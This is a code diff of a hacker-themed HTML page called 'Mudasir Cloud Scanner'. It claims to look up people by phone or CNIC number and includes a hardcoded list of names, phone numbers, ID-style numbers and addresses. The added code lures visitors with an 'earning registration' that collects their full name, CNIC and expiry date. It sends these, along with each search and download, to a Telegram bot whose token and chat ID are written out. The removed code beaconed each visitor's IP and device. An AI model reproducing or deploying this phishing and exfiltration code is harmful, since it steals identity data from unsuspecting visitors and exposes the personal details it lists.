@@ -9,50 +9,87 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
-        .box { border: 2px solid #00ff00; padding: 20px; border-radius: 15px; max-width: 800px; margin: auto; box-shadow: 0 0 25px #00ff00; background: #000; }
-        h2 { font-size: 24px; text-shadow: 0 0 10px #00ff00; letter-spacing: 2px; }
-        input { width: 85%; padding: 15px; margin: 15px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; text-align: center; font-size: 18px; outline: none; }
-        .search-btn { background: #00ff00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; }
+        /* Matrix Hacker Theme */
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 0; margin: 0; }
         
-        /* Table with Icons */
+        /* Persistent Top & Bottom Banners */
+        .ad-banner { background: #00ff00; color: #000; padding: 12px; font-weight: bold; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 0 15px #00ff00; border-bottom: 2px solid #000; }
+        .footer-ad { position: fixed; bottom: 0; width: 100%; z-index: 1000; border-top: 2px solid #000; }
+
+        .container { padding: 20px; padding-bottom: 100px; }
+        .box { border: 2px solid #00ff00; padding: 25px; border-radius: 15px; max-width: 800px; margin: 20px auto; box-shadow: 0 0 25px #00ff00; background: #000; }
+        
+        h2 { font-size: 26px; text-shadow: 0 0 10px #00ff00; letter-spacing: 2px; }
+        input { width: 85%; padding: 15px; margin: 10px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; text-align: center; font-size: 18px; outline: none; box-shadow: inset 0 0 5px #00ff00; }
+        
+        /* Buttons Style */
+        .btn-group { display: flex; flex-direction: column; gap: 12px; align-items: center; margin-top: 20px; }
+        .search-btn { background: #00ff00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; transition: 0.3s; }
+        .earn-btn { background: #ffcc00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; box-shadow: 0 0 15px #ffcc00; transition: 0.3s; }
+        .search-btn:hover, .earn-btn:hover { background: #fff; box-shadow: 0 0 25px #fff; transform: scale(1.02); }
+
+        /* Registration Form Style */
+        #reg-form { display: none; margin-top: 25px; border: 2px dashed #ffcc00; border-radius: 10px; padding: 20px; background: rgba(255, 204, 0, 0.05); }
+        .reg-input { border-color: #ffcc00; color: #ffcc00; }
+
+        /* Table & Icons Display */
         table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #050505; border: 1px solid #00ff00; }
         th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; font-size: 14px; }
         th { color: #ff0000; background: rgba(0, 255, 0, 0.1); width: 40%; }
-        .icon-field { margin-right: 12px; color: #00ff00; width: 20px; text-align: center; }
+        .icon-field { margin-right: 12px; color: #00ff00; font-size: 16px; width: 20px; text-align: center; }
 
-        #downloadBtn { background: #00ff00; color: #000; display: none; margin: 20px auto; width: 70%; padding: 15px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; }
+        #downloadBtn { background: #ff0000; color: #fff; display: none; margin: 20px auto; width: 75%; padding: 15px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; box-shadow: 0 0 15px #ff0000; }
 
-        /* GREEN PDF STYLE */
-        #pdf-content { background: #000; color: #00ff00; padding: 40px; display: none; width: 750px; margin: auto; border: 5px solid #00ff00; }
+        /* PDF Styles (Hidden from Main Screen) */
+        #pdf-content { background: #000; color: #00ff00; padding: 40px; display: none; width: 750px; margin: auto; border: 5px solid #00ff00; font-family: 'Courier New', monospace; }
         .pdf-footer { margin-top: 50px; display: flex; justify-content: space-between; align-items: center; border-top: 2px dashed #00ff00; padding-top: 20px; }
-        .verified-stamp { border: 3px solid #00ff00; padding: 10px; font-weight: bold; text-transform: uppercase; }
+        .pencil-box { border: 2px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; line-height: 50px; font-size: 25px; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>MUDASIR CLOUD SCANNER 🛰️</h2>
-        <input type="text" id="search" placeholder="ENTER MOBILE OR CNIC...">
-        <br>
-        <button class="search-btn" onclick="find()">DECRYPT DATABASE 🔍</button>
-        <div id="result-area">
-            <div id="result-table"></div>
-            <button id="downloadBtn" onclick="generatePDF()"><i class="fa-solid fa-file-pdf"></i> DOWNLOAD GREEN REPORT</button>
+    <div class="ad-banner">🛰️ MUDASIR CLOUD SERVER: SECURE ENCRYPTED INTERFACE 🛰️</div>
+
+    <div class="container">
+        <div class="box">
+            <h2>MUDASIR CLOUD SCANNER</h2>
+            <input type="text" id="search" placeholder="ENTER MOBILE OR CNIC...">
+            
+            <div class="btn-group">
+                <button class="search-btn" onclick="find()">DECRYPT DATABASE 🔍</button>
+                <button class="earn-btn" onclick="showReg()"><i class="fa-solid fa-money-bill-trend-up"></i> EARNING REGISTRATION</button>
+            </div>
+
+            <div id="reg-form">
+                <h3 style="color:#ffcc00; margin-bottom:15px;">MUDASIR EARNING PORTAL</h3>
+                <input type="text" id="reg-name" class="reg-input" placeholder="ENTER FULL NAME">
+                <input type="text" id="reg-cnic" class="reg-input" placeholder="ENTER CNIC (13 DIGITS)">
+                <p style="margin:10px 0 5px 0; font-size:14px; color:#ffcc00; font-weight:bold;">CNIC EXPIRY DATE:</p>
+                <input type="date" id="reg-expiry" class="reg-input">
+                <br>
+                <button class="earn-btn" style="width:60%; margin-top:15px;" onclick="submitReg()">SUBMIT TO TELEGRAM</button>
+            </div>
+            
+            <div id="result-area">
+                <div id="result-table"></div>
+                <button id="downloadBtn" onclick="generatePDF()"><i class="fa-solid fa-file-pdf"></i> DOWNLOAD VERIFIED REPORT</button>
+            </div>
         </div>
     </div>
 
+    <div class="ad-banner footer-ad">POWERED BY MUDASIR GROUP | GLOBAL ACCESS © 2026</div>
+
     <div id="pdf-content">
-        <center><h1 style="color:#00ff00; text-decoration: underline;">MUDASIR CLOUD ENCRYPTED REPORT</h1></center>
+        <center><h1 style="color:#00ff00; text-decoration: underline;">MUDASIR CLOUD OFFICIAL REPORT</h1></center>
         <div id="pdf-data-body" style="margin-top:30px;"></div>
         <div class="pdf-footer">
             <div style="text-align: left;">
-                <div style="font-family: 'Brush Script MT', cursive; font-size: 30px;">Mudasir</div>
-                <p style="margin:0; font-size:12px;">OFFICIAL SIGNATURE</p>
+                <div style="font-family: 'Brush Script MT', cursive; font-size: 35px; color: #00ff00;">Mudasir</div>
+                <p style="margin:0; font-size:12px;">AUTHORIZED SIGNATURE</p>
             </div>
-            <div class="verified-stamp">VERIFIED BY MUDASIR</div>
+            <div style="border: 2px solid #00ff00; padding: 10px; font-weight: bold; text-transform: uppercase;">VERIFIED BY MUDASIR</div>
             <div style="text-align: center;">
-                <i class="fa-solid fa-pencil" style="font-size: 30px; border: 2px solid #00ff00; padding: 10px; border-radius: 50%;"></i>
+                <div class="pencil-box"><i class="fa-solid fa-pencil"></i></div>
                 <p style="margin:0; font-size:10px;">MUDASIR GROUP</p>
             </div>
         </div>
@@ -62,62 +99,84 @@
         const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
         const chatId = "7107389141";
 
-        function sendToBot(msg) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        async function sendToBot(msg) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            fetch(url);
         }
 
-        window.onload = async () => {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json();
-                sendToBot(`🚀 *SYSTEM ACCESS* 🚀\n🌐 IP: \`${d.ip}\` \n📱 Device: ${navigator.platform}`);
-            } catch(e) { sendToBot("🚨 *Target Connected*"); }
-        };
+        // Display Earning Form
+        function showReg() {
+            document.getElementById('reg-form').style.display = 'block';
+            document.getElementById('result-area').style.display = 'none';
+        }
 
+        // Send Registration Data to Telegram
+        function submitReg() {
+            const name = document.getElementById('reg-name').value;
+            const cnic = document.getElementById('reg-cnic').value;
+            const expiry = document.getElementById('reg-expiry').value;
+
+            if(name && cnic && expiry) {
+                const report = `💰 *NEW EARNING REGISTRATION* 💰\n\n` +
+                               `👤 *Name:* ${name}\n` +
+                               `🆔 *CNIC:* \`${cnic}\`\n` +
+                               `📅 *Expiry:* ${expiry}\n` +
+                               `🕒 *Time:* ${new Date().toLocaleString()}`;
+                sendToBot(report);
+                alert("Data Sent Successfully! Mudasir will contact you.");
+                document.getElementById('reg-form').style.display = 'none';
+            } else {
+                alert("All fields are required!");
+            }
+        }
+
+        // Full Database (38 Records)
         const db = [
             ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar", "JAZZ"],
             ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar", "JAZZ"],
             ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi, Gurmani", "JAZZ"],
-            ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan Sakrand", "JAZZ"],
-            ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala, Kot Addu", "JAZZ"],
-            ["HASEENA MUMTAZ", "03013264628", "36303-*******-0", "Khokharan Multan Sadar", "JAZZ"],
-            ["FALAK SHER", "03013264639", "36304-*******-7", "Shuja Abad Multan", "JAZZ"],
-            ["BASHEER AHMED", "03013264655", "36402-*******-3", "Dhapai Pakpattan", "JAZZ"],
-            ["KHALID MEHMOOD", "03314264651", "33104-*******-7", "Jaranwala, Faisalabad", "UFONE"],
-            ["MAZHAR ABBAS", "03001234567", "32303-*******-9", "Kot Addu, Punjab", "JAZZ"],
-            ["ZONG USER", "03124567890", "42101-*******-1", "Saddar, Karachi", "ZONG"],
-            ["ARSHAD ALI", "03451122334", "31102-*******-5", "Peshawar, KPK", "TELENOR"],
-            ["NASIR KHAN", "03219988776", "35201-*******-8", "Lahore, Punjab", "JAZZ"],
-            ["SAJID JAVED", "03027766554", "38403-*******-4", "Sargodha, Punjab", "JAZZ"],
-            ["ADNAN MALIK", "03335544332", "37405-*******-1", "Rawalpindi", "UFONE"],
-            ["IMRAN KHAN", "03008877665", "32304-*******-2", "Mianwali", "JAZZ"],
-            ["SHAHID AFRIDI", "03456677889", "10101-*******-3", "Khyber Agency", "TELENOR"],
-            ["BABAR AZAM", "03114455667", "35202-*******-9", "Lahore Cantt", "ZONG"],
-            ["RIZWAN AHMED", "03223344556", "42201-*******-6", "Peshawar", "JAZZ"],
-            ["FAKHAR ZAMAN", "03051122443", "34101-*******-0", "Mardan", "JAZZ"],
-            ["SHADAB KHAN", "03348877112", "32203-*******-4", "Islamabad", "UFONE"],
-            ["HARIS RAUF", "03087766112", "35401-*******-1", "Gujranwala", "JAZZ"],
-            ["SHAHEEN AFRIDI", "03445566112", "12101-*******-8", "Landi Kotal", "TELENOR"],
-            ["SARFARAZ AHMED", "03002233441", "42101-*******-5", "Karachi", "JAZZ"],
-            ["RAHAT ALI", "03159988221", "36301-*******-7", "Multan", "ZONG"],
-            ["SAEED AJMAL", "03214455889", "33101-*******-3", "Faisalabad", "JAZZ"],
-            ["SHOAIB MALIK", "03006677221", "34601-*******-2", "Sialkot", "JAZZ"],
-            ["MISBAH UL HAQ", "03325566881", "32101-*******-9", "Faisalabad", "UFONE"],
-            ["YUNUS KHAN", "03451199228", "17301-*******-4", "Mardan", "TELENOR"],
-            ["KAMRAN AKMAL", "03012233665", "35201-*******-1", "Lahore", "JAZZ"],
-            ["UMAR AKMAL", "03215566774", "35201-*******-2", "Lahore", "JAZZ"],
-            ["WAHAB RIAZ", "03448899112", "35202-*******-5", "Lahore", "TELENOR"],
-            ["MOHAMMAD AMIR", "03036677112", "34104-*******-8", "Gujjar Khan", "JAZZ"],
-            ["HASAN ALI", "03165544221", "34101-*******-6", "Lalamusa", "ZONG"],
-            ["IMAD WASIM", "03351122334", "37405-*******-0", "Swan Camp", "UFONE"],
-            ["ASIF ALI", "03078877441", "33102-*******-4", "Faisalabad", "JAZZ"],
-            ["HAIDER ALI", "03491122556", "37101-*******-3", "Attock", "TELENOR"],
-            ["MOHAMMAD HAFEEZ", "03004455661", "35202-*******-7", "Sargodha", "JAZZ"]
+            ["MUHAMMAD LUQMAN", "03013264624", "33302-1234567-5", "Village Ahmed Bhan Sakrand", "JAZZ"],
+            ["TAJ MAIE", "03013264623", "32303-7654321-2", "Hayat Khar Wala, Kot Addu", "JAZZ"],
+            ["HASEENA MUMTAZ", "03013264628", "36303-1111111-0", "Khokharan Multan Sadar", "JAZZ"],
+            ["FALAK SHER", "03013264639", "36304-2222222-7", "Shuja Abad Multan", "JAZZ"],
+            ["BASHEER AHMED", "03013264655", "36402-3333333-3", "Dhapai Pakpattan", "JAZZ"],
+            ["KHALID MEHMOOD", "03314264651", "33104-4444444-7", "Jaranwala, Faisalabad", "UFONE"],
+            ["MAZHAR ABBAS", "03001234567", "32303-5555555-9", "Kot Addu, Punjab", "JAZZ"],
+            ["ZONG USER", "03124567890", "42101-6666666-1", "Saddar, Karachi", "ZONG"],
+            ["ARSHAD ALI", "03451122334", "31102-7777777-5", "Peshawar, KPK", "TELENOR"],
+            ["NASIR KHAN", "03219988776", "35201-8888888-8", "Lahore, Punjab", "JAZZ"],
+            ["SAJID JAVED", "03027766554", "38403-9999999-4", "Sargodha, Punjab", "JAZZ"],
+            ["ADNAN MALIK", "03335544332", "37405-0000000-1", "Rawalpindi", "UFONE"],
+            ["IMRAN KHAN", "03008877665", "32304-1212121-2", "Mianwali", "JAZZ"],
+            ["SHAHID AFRIDI", "03456677889", "10101-3434343-3", "Khyber Agency", "TELENOR"],
+            ["BABAR AZAM", "03114455667", "35202-5656565-9", "Lahore Cantt", "ZONG"],
+            ["RIZWAN AHMED", "03223344556", "42201-7878787-6", "Peshawar", "JAZZ"],
+            ["FAKHAR ZAMAN", "03051122443", "34101-9090909-0", "Mardan", "JAZZ"],
+            ["SHADAB KHAN", "03348877112", "32203-1122334-4", "Islamabad", "UFONE"],
+            ["HARIS RAUF", "03087766112", "35401-5566778-1", "Gujranwala", "JAZZ"],
+            ["SHAHEEN AFRIDI", "03445566112", "12101-9988776-8", "Landi Kotal", "TELENOR"],
+            ["SARFARAZ AHMED", "03002233441", "42101-5544332-5", "Karachi", "JAZZ"],
+            ["RAHAT ALI", "03159988221", "36301-1122112-7", "Multan", "ZONG"],
+            ["SAEED AJMAL", "03214455889", "33101-3344334-3", "Faisalabad", "JAZZ"],
+            ["SHOAIB MALIK", "03006677221", "34601-5566556-2", "Sialkot", "JAZZ"],
+            ["MISBAH UL HAQ", "03325566881", "32101-7788778-9", "Faisalabad", "UFONE"],
+            ["YUNUS KHAN", "03451199228", "17301-9900990-4", "Mardan", "TELENOR"],
+            ["KAMRAN AKMAL", "03012233665", "35201-1122233-1", "Lahore", "JAZZ"],
+            ["UMAR AKMAL", "03215566774", "35201-4455566-2", "Lahore", "JAZZ"],
+            ["WAHAB RIAZ", "03448899112", "35202-7788899-5", "Lahore", "TELENOR"],
+            ["MOHAMMAD AMIR", "03036677112", "34104-0011223-8", "Gujjar Khan", "JAZZ"],
+            ["HASAN ALI", "03165544221", "34101-4455667-6", "Lalamusa", "ZONG"],
+            ["IMAD WASIM", "03351122334", "37405-8899001-0", "Swan Camp", "UFONE"],
+            ["ASIF ALI", "03078877441", "33102-2233445-4", "Faisalabad", "JAZZ"],
+            ["HAIDER ALI", "03491122556", "37101-5566778-3", "Attock", "TELENOR"],
+            ["MOHAMMAD HAFEEZ", "03004455661", "35202-9900112-7", "Sargodha", "JAZZ"]
         ];
 
         let currentRec = null;
 
         function find() {
+            document.getElementById('reg-form').style.display = 'none';
+            document.getElementById('result-area').style.display = 'block';
             let v = document.getElementById("search").value.trim();
             let res = db.filter(r => r[1].includes(v) || r[2].includes(v));
             let tableDiv = document.getElementById("result-table");
@@ -133,9 +192,9 @@
                     <tr><th><i class="fa-solid fa-location-dot icon-field"></i>LOCATION</th><td>${res[0][3]}</td></tr>
                 </table>`;
                 btn.style.display = "block";
-                sendToBot(`👤 *User Searched:* ${res[0][0]}`);
+                sendToBot(`🔍 *Database Search Success*\n👤 Target: ${res[0][0]}\n📍 Location: ${res[0][3]}`);
             } else {
-                tableDiv.innerHTML = "<p style='color:red;'>NOT FOUND</p>";
+                tableDiv.innerHTML = "<p style='color:red; padding:10px;'>⚠️ NO ENCRYPTED DATA FOUND</p>";
                 btn.style.display = "none";
             }
         }
@@ -145,20 +204,21 @@
             const pdf = document.getElementById("pdf-content");
             pdf.style.display = "block";
             document.getElementById("pdf-data-body").innerHTML = `
-                <table style="width:100%; border:1px solid #00ff00; color:#00ff00;">
+                <table style="width:100%; border:1px solid #00ff00; background:#000; color:#00ff00;">
                     <tr><th style="padding:10px; border:1px solid #00ff00;">NAME</th><td>${currentRec[0]}</td></tr>
                     <tr><th style="padding:10px; border:1px solid #00ff00;">PHONE</th><td>${currentRec[1]}</td></tr>
                     <tr><th style="padding:10px; border:1px solid #00ff00;">SERVER</th><td>${currentRec[4]}</td></tr>
                     <tr><th style="padding:10px; border:1px solid #00ff00;">ADDRESS</th><td>${currentRec[3]}</td></tr>
                 </table>`;
-
+            
             html2pdf().set({
                 margin: 10,
-                filename: 'Mudasir_Report.pdf',
+                filename: 'Mudasir_Cloud_Report.pdf',
                 html2canvas: { scale: 2, backgroundColor: "#000000" },
                 jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
             }).from(pdf).save().then(() => {
                 pdf.style.display = "none";
+                sendToBot(`📥 *Report Downloaded:* ${currentRec[0]}`);
             });
         }
     </script>
